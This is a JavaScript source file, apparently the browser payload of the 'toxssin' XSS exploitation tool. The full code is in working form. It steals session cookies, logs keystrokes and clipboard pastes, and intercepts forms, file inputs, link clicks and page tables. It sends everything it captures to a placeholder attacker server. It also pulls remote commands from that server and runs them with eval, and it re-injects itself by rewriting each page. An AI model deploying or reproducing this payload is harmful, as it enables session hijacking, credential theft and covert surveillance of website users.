
// This script is part of the toxssin project.
// Written by t3l3machus

function nl2br(txt) {
	return txt.replace(/(\r\n|\n|\r)/gm, '<%LineBreak>');
};


function urlencodeFormData(fd) {
	
    var s = '';
    function encode(s){ return encodeURIComponent(s).replace(/%20/g,'+'); }
    
    for (var pair of fd.entries()) {
        if (typeof pair[1] == 'string') {
            s += (s?'&':'') + encode(pair[0]) + '=' + encode(pair[1]);
        }
    }
    return s;
};


function rewriteDocument(html) {

	var doc = document.open("text/html");
	doc.write(html);
	doc.close();
};


function xhr_get_intercept(capture, r = false) {
	
	let xhttp = new XMLHttpRequest();
	xhttp.open("GET", `*TOXSSIN_SERVER*/${btoa(capture)}`, true);
	xhttp.setRequestHeader('X-toxssin-id', '*SESSIONID*');
	xhttp.send();
	
	if (r) {
		return xhttp;
	}
};


function xhr_post_intercept(capture, event_hash, data_type = 'form', form_attrs = '', r = false) {
	
	let xhttp = new XMLHttpRequest();
	xhttp.open("POST", `*TOXSSIN_SERVER*/${event_hash}`, true);
	xhttp.setRequestHeader('X-toxssin-id', '*SESSIONID*');
	
	for (let attr in form_attrs) {
		xhttp.setRequestHeader(`X-form-${attr}`, form_attrs[attr]);
	}

	if (data_type === 'form'){

		xhttp.send(new FormData(capture));
		
		} else {
			xhttp.send(capture);
		}

	if (r) {
		return xhttp;
	}
};


function command_parser() {
	
	let cmd = new XMLHttpRequest();
	cmd.open("GET", `*TOXSSIN_SERVER*/a95f7870b615a4df433314f10da26548`, true);
	cmd.setRequestHeader('X-toxssin-id', '*SESSIONID*');
	
	cmd.onreadystatechange = function() {
		
		if (this.readyState == 4) {
			
			let path = cmd.getResponseHeader('Content-type');
			
			if (path !== 'None' && cmd.responseText.includes('<%NoCmdIssued%>') === false) {
				//exec cmd
				let result = '';
				let meta, err;
						
				try {
					result = eval(this.responseText);
					err = 0;
					
				} catch (error) {
					result = String(error);
					err = 1;				
				}
				
				meta = {'script': path, 'error': err}
				xhr_post_intercept(result, '7f47fd7ae404fa7c0448863ac3db9c85', 'FormData', meta);
				
			} else {
				return;
			}
		}
	};
	
	cmd.send();	
};


//  #########  DISCLAIMER: #########
//  MD5 hash function:
//  Original copyright (c) Paul Johnston & Greg Holt.

function md5(inputString) {
    var hc="0123456789abcdef";
    function rh(n) {var j,s="";for(j=0;j<=3;j++) s+=hc.charAt((n>>(j*8+4))&0x0F)+hc.charAt((n>>(j*8))&0x0F);return s;}
    function ad(x,y) {var l=(x&0xFFFF)+(y&0xFFFF);var m=(x>>16)+(y>>16)+(l>>16);return (m<<16)|(l&0xFFFF);}
    function rl(n,c)            {return (n<<c)|(n>>>(32-c));}
    function cm(q,a,b,x,s,t)    {return ad(rl(ad(ad(a,q),ad(x,t)),s),b);}
    function ff(a,b,c,d,x,s,t)  {return cm((b&c)|((~b)&d),a,b,x,s,t);}
    function gg(a,b,c,d,x,s,t)  {return cm((b&d)|(c&(~d)),a,b,x,s,t);}
    function hh(a,b,c,d,x,s,t)  {return cm(b^c^d,a,b,x,s,t);}
    function ii(a,b,c,d,x,s,t)  {return cm(c^(b|(~d)),a,b,x,s,t);}
    function sb(x) {
        var i;var nblk=((x.length+8)>>6)+1;var blks=new Array(nblk*16);for(i=0;i<nblk*16;i++) blks[i]=0;
        for(i=0;i<x.length;i++) blks[i>>2]|=x.charCodeAt(i)<<((i%4)*8);
        blks[i>>2]|=0x80<<((i%4)*8);blks[nblk*16-2]=x.length*8;return blks;
    }
    var i,x=sb(inputString),a=1732584193,b=-271733879,c=-1732584194,d=271733878,olda,oldb,oldc,oldd;
    for(i=0;i<x.length;i+=16) {olda=a;oldb=b;oldc=c;oldd=d;
        a=ff(a,b,c,d,x[i+ 0], 7, -680876936);d=ff(d,a,b,c,x[i+ 1],12, -389564586);c=ff(c,d,a,b,x[i+ 2],17,  606105819);
        b=ff(b,c,d,a,x[i+ 3],22,-1044525330);a=ff(a,b,c,d,x[i+ 4], 7, -176418897);d=ff(d,a,b,c,x[i+ 5],12, 1200080426);
        c=ff(c,d,a,b,x[i+ 6],17,-1473231341);b=ff(b,c,d,a,x[i+ 7],22,  -45705983);a=ff(a,b,c,d,x[i+ 8], 7, 1770035416);
        d=ff(d,a,b,c,x[i+ 9],12,-1958414417);c=ff(c,d,a,b,x[i+10],17,     -42063);b=ff(b,c,d,a,x[i+11],22,-1990404162);
        a=ff(a,b,c,d,x[i+12], 7, 1804603682);d=ff(d,a,b,c,x[i+13],12,  -40341101);c=ff(c,d,a,b,x[i+14],17,-1502002290);
        b=ff(b,c,d,a,x[i+15],22, 1236535329);a=gg(a,b,c,d,x[i+ 1], 5, -165796510);d=gg(d,a,b,c,x[i+ 6], 9,-1069501632);
        c=gg(c,d,a,b,x[i+11],14,  643717713);b=gg(b,c,d,a,x[i+ 0],20, -373897302);a=gg(a,b,c,d,x[i+ 5], 5, -701558691);
        d=gg(d,a,b,c,x[i+10], 9,   38016083);c=gg(c,d,a,b,x[i+15],14, -660478335);b=gg(b,c,d,a,x[i+ 4],20, -405537848);
        a=gg(a,b,c,d,x[i+ 9], 5,  568446438);d=gg(d,a,b,c,x[i+14], 9,-1019803690);c=gg(c,d,a,b,x[i+ 3],14, -187363961);
        b=gg(b,c,d,a,x[i+ 8],20, 1163531501);a=gg(a,b,c,d,x[i+13], 5,-1444681467);d=gg(d,a,b,c,x[i+ 2], 9,  -51403784);
        c=gg(c,d,a,b,x[i+ 7],14, 1735328473);b=gg(b,c,d,a,x[i+12],20,-1926607734);a=hh(a,b,c,d,x[i+ 5], 4,    -378558);
        d=hh(d,a,b,c,x[i+ 8],11,-2022574463);c=hh(c,d,a,b,x[i+11],16, 1839030562);b=hh(b,c,d,a,x[i+14],23,  -35309556);
        a=hh(a,b,c,d,x[i+ 1], 4,-1530992060);d=hh(d,a,b,c,x[i+ 4],11, 1272893353);c=hh(c,d,a,b,x[i+ 7],16, -155497632);
        b=hh(b,c,d,a,x[i+10],23,-1094730640);a=hh(a,b,c,d,x[i+13], 4,  681279174);d=hh(d,a,b,c,x[i+ 0],11, -358537222);
        c=hh(c,d,a,b,x[i+ 3],16, -722521979);b=hh(b,c,d,a,x[i+ 6],23,   76029189);a=hh(a,b,c,d,x[i+ 9], 4, -640364487);
        d=hh(d,a,b,c,x[i+12],11, -421815835);c=hh(c,d,a,b,x[i+15],16,  530742520);b=hh(b,c,d,a,x[i+ 2],23, -995338651);
        a=ii(a,b,c,d,x[i+ 0], 6, -198630844);d=ii(d,a,b,c,x[i+ 7],10, 1126891415);c=ii(c,d,a,b,x[i+14],15,-1416354905);
        b=ii(b,c,d,a,x[i+ 5],21,  -57434055);a=ii(a,b,c,d,x[i+12], 6, 1700485571);d=ii(d,a,b,c,x[i+ 3],10,-1894986606);
        c=ii(c,d,a,b,x[i+10],15,   -1051523);b=ii(b,c,d,a,x[i+ 1],21,-2054922799);a=ii(a,b,c,d,x[i+ 8], 6, 1873313359);
        d=ii(d,a,b,c,x[i+15],10,  -30611744);c=ii(c,d,a,b,x[i+ 6],15,-1560198380);b=ii(b,c,d,a,x[i+13],21, 1309151649);
        a=ii(a,b,c,d,x[i+ 4], 6, -145523070);d=ii(d,a,b,c,x[i+11],10,-1120210379);c=ii(c,d,a,b,x[i+ 2],15,  718787259);
        b=ii(b,c,d,a,x[i+ 9],21, -343485551);a=ad(a,olda);b=ad(b,oldb);c=ad(c,oldc);d=ad(d,oldd);
    }
    return rh(a)+rh(b)+rh(c)+rh(d);
};


function spiderTables() {
	
	let tables = document.getElementsByTagName("table");
	
	if (tables.length){	
		for (let i = 0; i < tables.length; i++) {
			try {
				if (tables[i].tBodies[0].rows.length > 0) {
					let current_digest = tables[i].getAttribute("_digest");
					tables[i].removeAttribute("_digest");
					let md5hash = md5(tables[i].innerHTML);	

					if (current_digest !== md5hash){
						xhr_post_intercept('\n\n'+tables[i].outerHTML+'\n\n', 'x8cwa2h4252tc79ce5b731r3fdc75483', 'FormData');										
					}
					
					tables[i].setAttribute('_digest', md5hash);	
				}
			} catch (TypeError) {
				//pass
			}
		}
	}
};


function grab_cookie() {
	let capture = `'event':'cookie', 'data':'${document.cookie}'`;
	xhr_get_intercept(capture);
};


function interceptForm() {
	
	event.preventDefault();
	let f = this;
	let action, capture;
	
	if (f.action.includes("http")) {	
		action = f.action;
		
	} else {
		action = window.location.origin + f.action;
	}
	
	let form_attrs = {'action':f.action, 'method':f.method.toUpperCase(), 'enctype':f.enctype,'encoding':f.encoding};
	
	if (f.method.toUpperCase() === 'POST') {	
		xhr_post_intercept(f, 'd3cba2942555c79ce5b73193fd6f5614', 'form', form_attrs, true);
		
	} else if (f.method.toUpperCase() === 'GET') {
		
		let inputs = f.getElementsByTagName("input");
		let url_arguments = new Array;
		
		if (inputs.length > 0) {			
			for (let i = 0; i < inputs.length; i++) {				
				if (inputs[i].name != '') {					
					url_arguments[i] = `${inputs[i].name}=${escape(nl2br(inputs[i].value))}`;					
					get_params = `?${escape(nl2br(url_arguments.join('&')))}`; 
				}
			} 
		}
		xhr_post_intercept(get_params, 'd3cba2942555c79ce5b73193fd6f5614', 'FormData', form_attrs);
	}
	interceptResponse(f);
};


function interceptResponse(form) {
	
	//Mimic request to intercept response
	let response = new XMLHttpRequest();
	let current_location = window.location.origin + window.location.pathname;
	let method = form.method.toUpperCase();
	let action;
	
		if (form.action.includes("http")) {
			action = form.action;
		} else {
			action = window.location.origin + form.action;
		}
		
		response.open(method, action, true);
		response.withCredentials = true;	
		response.onreadystatechange = function() {
			
			if (this.readyState == 4) {
				
				let response_headers = this.getAllResponseHeaders();							
				let response_status_text = this.statusText;
				let response_status_code = 0; 
				
				if (current_location === this.responseURL) {
					response_status_code = 302;
					
				} else {
					response_status_code = this.status;
				}
				
				let response_attrs = {'source':'form', 'status':response_status_code, 'statusText':response_status_text, 'responseHeaders':nl2br(response_headers)}
				let response_data = new FormData();

				response_data.append('response-body', this.responseText);
				xhr_post_intercept(response_data, '1a60f7f722fd94513b92bd2b19c4f7d4', 'FormData', response_attrs); //THIS SHOULD END WITH FALSE(?)
				rewriteDocument(this.responseText.replace("</body>", '<script src="*TOXSSIN_SERVER*/*HANDLER*"></script></body>'));
			}
		}
		
	if (method === 'POST' && form.enctype === 'application/x-www-form-urlencoded') {
		response.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
		response.setRequestHeader('Upgrade-Insecure-Requests', '1');
		response.send(urlencodeFormData(new FormData(form)));
		
	} else {
		response.send(new FormData(form));
	}
};


function interceptFileSelection() {
	xhr_post_intercept(this.form, '7f30f7d702fd94515b82bd2b19c2f7d4', 'form', '');
};


function interceptLink() {
	
	event.preventDefault();
	original_href = this.href;
	
	let href = '';
	
	//Declare click event
	let capture = `'event':'link-clicked', 'href':'${escape(nl2br(original_href))}'`;
	xhr_get_intercept(capture);

	//Attempt to intercept response
	if (original_href.includes("http")) {
		href = original_href;
	} else {
		href = window.location.origin + original_href;		
	} 
	
	let xhttp = new XMLHttpRequest();
	xhttp.open("GET", href, true);
	xhttp.withCredentials = true;
	
	
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4) {		
			
			let response_headers = this.getAllResponseHeaders();	
			let response_attrs = {'source':'link', 'href':escape(nl2br(href)), 'status':this.status, 'statusText':this.statusText, 'responseHeaders':nl2br(response_headers)};			
			xhr_post_intercept(this.responseText + '\n', '1a60f7f722fd94513b92bd2b19c4f7d4', 'FormData', response_attrs, true);			
			rewriteDocument(this.responseText.replace("</body>", '<script src="*TOXSSIN_SERVER*/*HANDLER*"></script></body>'));
		}
	}	
	
	xhttp.send();	
};


function spiderElements(tags, event, func) {
	
	let doc_elements = document.querySelectorAll(tags);
	let injection_mark = "amBEd34g8l2";
	let count = 0;
	
	if (doc_elements.length > 0) {
		for (let i = 0; i < doc_elements.length; i ++) {
			
			switch (tags) {
				case "a":
				
					let includes_hash = doc_elements[i].href.includes("#");
					
					if (doc_elements[i].getAttribute("_") != injection_mark && includes_hash === false && doc_elements[i].href != "") {					
						doc_elements[i].addEventListener(event, func);		
						doc_elements[i].setAttribute("_", injection_mark);
						count += 1;										
					}
					
					break;
				
				case "*POISON_ELEMENTS*":
				
					let typingTimer;
					let doneTypingInterval = 500;
					
					if (doc_elements[i].getAttribute("_") != injection_mark || doc_elements[i].oninput === null) {
						
						if (['select-one', 'select-multiple', 'radio', 'checkbox', 'date', 'datetime-local'].includes(doc_elements[i].type)) {
							doc_elements[i].oninput = () => {
								let capture = `'event':'input-changed', 'name':'${doc_elements[i].name}', 'type':'${doc_elements[i].type}', 'value':'${doc_elements[i].value}'`; 
								xhr_get_intercept(capture);							
							};
							
						} else {
							doc_elements[i].oninput= () => {
								clearTimeout(typingTimer);
								if (doc_elements[i].value) {
									typingTimer = setTimeout(function(){
										let capture = `'event':'input-changed', 'name':'${doc_elements[i].name}', 'type':'${doc_elements[i].type}', 'value':'${escape(nl2br(doc_elements[i].value))}'`; 
										xhr_get_intercept(capture);
									}, doneTypingInterval);
								}
							};
						}
						doc_elements[i].setAttribute("_", injection_mark);
						count += 1;
					}				
					
					break;

				case "form":
				
					if (doc_elements[i].getAttribute("_") != injection_mark && doc_elements[i].action !== '' && doc_elements[i].action.includes("void") === false) {
						doc_elements[i].addEventListener(event, func);		
						doc_elements[i].setAttribute("_", injection_mark);
						count += 1;		
					}
					
					break;
					
				default:
					if (doc_elements[i].getAttribute("_") != injection_mark) {
						doc_elements[i].addEventListener(event, func);		
						doc_elements[i].setAttribute("_", injection_mark);
						count += 1;
					}
				}
			}
		}
	
	let prefix;
	
	if (count === 0) {
		return;
	}
	
	switch (tags) {
	
	case 'form':	
	
		if (count === 1) {
			prefix = 'form was';
			
		} else {
			prefix = 'forms were';
		}
		
		break;
		
	case "input[type='file']":
	
		if (count === 1) {
			prefix = 'file input was';
			
		} else {
			prefix = 'file inputs were';
		}
		
		break;
	
	case 'a':
	
		if (count === 1) {
			prefix = '(hashless) link was';
			
		} else {
			prefix = '(hashless) links were';
		}
		
		break;		
	
	
	case "*POISON_ELEMENTS*":

		if (count === 1) {
			prefix = 'input was';
			
		} else {
			prefix = 'inputs were';
		}
		
		break;		
	}
	
	let capture = `'event':'info', 'msg': '${count} x ${prefix} identified and injected with "${event}" event JavaScript poison.'`;
	xhr_get_intercept(capture);
};


function iseeyou(e) {
	
	let capture;
	
	if (['INPUT', 'TEXTAREA'].includes(e.target.tagName) === false) {
		
		if (event.type === 'keyup') { 
			capture = `'event':'keyup', 'keystroke':'${escape(e.key)}', 'target':'${e.target.tagName}', 'targetName':'${e.target.name}', 'targetType':'${e.target.type}'`;
			xhr_get_intercept(capture);	
			
		} else if (event.type === 'paste') {
			capture = `'event':'paste', 'data':'${escape(nl2br(e.clipboardData.getData("text/plain")))}', 'target':'${e.target.tagName}', 'targetName':'${e.target.name}'`;
			xhr_get_intercept(capture);	
		}
	}
};


function spiderAll() {
	
	//Spider all forms 
	spiderElements('form', 'submit', interceptForm);
	
	//Spider all file selections
	spiderElements("input[type='file']", 'change', interceptFileSelection);
	
	//Spider all links
	spiderElements('a', 'click', interceptLink);

	//Spider all input changes
	spiderElements("*POISON_ELEMENTS*", 'oninput', null);
};


function intoxicate() {

	//Grab cookie
	grab_cookie();
    
	//The following meta tag is added as part of the poisoning in order to not miss content 
	//during server response intercepts, due to the "mixed content" error
	//(e.g. 302 FOUND response with Location header pointing to http content).
	if (window.location.href.split("://")[0] === 'https' && document.getElementById("force_upgrade_sec_policy") === null) {
		document.getElementsByTagName("head")[0].insertAdjacentHTML('beforeend', '<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" id="force_upgrade_sec_policy">');
	}
	
	spiderAll();
	document.addEventListener("keyup", iseeyou);
	document.addEventListener("paste", iseeyou);
	if (*SPIDER_TABLES*) { spiderTables(); }
	
	setInterval(() => {
		command_parser()
		grab_cookie();
		spiderAll();
		if (*SPIDER_TABLES*) { spiderTables(); }
	},  *POISON_FREQUENCY*);
};

intoxicate();
